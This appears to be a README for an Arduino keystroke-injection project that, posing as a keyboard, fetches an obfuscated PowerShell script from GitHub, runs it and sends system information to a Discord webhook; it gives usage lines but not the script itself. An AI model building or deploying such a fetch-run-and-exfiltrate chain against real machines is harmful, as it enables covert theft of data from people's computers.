This PowerShell script collects basic system information and sends it to a specified webhook URL.
Supports basic Discord webhooks and also shortened links.

I am using https://app.bosint.gg to obfuscate the script simply modifying the `([ScriptBlock]::Create($c)).Invoke()` to `([ScriptBlock]::Create($c)).Invoke($args[0])` to have to compatiable.

## How it works

- We obfuscate the [example script](https://github.com/calinux-py/Arduino/blob/main/systeminfo/systeminfo.ps1)
- Arduino usb calls to github [raw powershell script](https://raw.githubusercontent.com/calinux-py/Arduino/refs/heads/main/systeminfo/obfu_systeminfo.ps1)
- Acting as a keyboard, Arduino USB executes remote script and sends basic system info to Discord webhook

This is obviously for demo purposes and testing stuff

\## Usage
```powershell
.\script.ps1 <webhook\_url>
```

```powershell
.\script.ps1 <shortened link>
```


